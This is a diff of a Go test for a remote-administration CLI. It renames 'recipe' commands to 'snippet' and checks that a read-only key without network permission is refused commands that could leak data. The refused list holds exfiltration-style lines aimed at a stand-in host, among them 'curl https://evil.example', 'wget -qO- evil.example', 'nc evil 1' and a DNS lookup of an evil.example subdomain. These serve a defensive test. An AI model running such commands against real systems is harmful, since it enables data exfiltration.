@@ -38,12 +38,12 @@ var (
 // A read key added without --network runs only komando's own reads of
 // targets in the inventory: nothing that dials a place the key names (cert
 // check of a URL), and no program of the key's choosing (exec, job
-// start, docker exec, cluster exec, recipe run), which could send rows out
+// start, docker exec, cluster exec, snippet exec), which could send rows out
 // in a URL or a DNS name.
 func TestGateNoNetwork(t *testing.T) {
 	invHome(t)
 	gateInventory(t)
-	mustRun(t, "recipe", "add", "my-df", "df -h", "--read-only")
+	mustRun(t, "snippet", "create", "my-df", "df -h", "--read-only")
 	const N = "SSH_GATE_NETWORK_REQUIRED"
 	refused := []string{
 		"cert check https://evil.example", "cert check web https://evil.example/x", "cert check smtps://evil.example",
@@ -51,7 +51,7 @@ func TestGateNoNetwork(t *testing.T) {
 		"x web --read-only -- nslookup a.evil.example", "run web --read-only -- wget -qO- evil.example",
 		"exec web --read-only --script -", "exec web --read-only --cmd 'nc evil 1'",
 		"job start web --read-only -- du -sh /var", "docker exec web app --read-only -- ls",
-		"cluster exec k8s pod/x --read-only -- ls", "recipe run my-df web", "recipe run disk web",
+		"cluster exec k8s pod/x --read-only -- ls", "snippet exec my-df web", "snippet exec disk web",
 		"-o json exec web --read-only -- curl https://evil.example", "--dry-run exec web --read-only -- uptime",
 	}
 	for _, line := range refused {
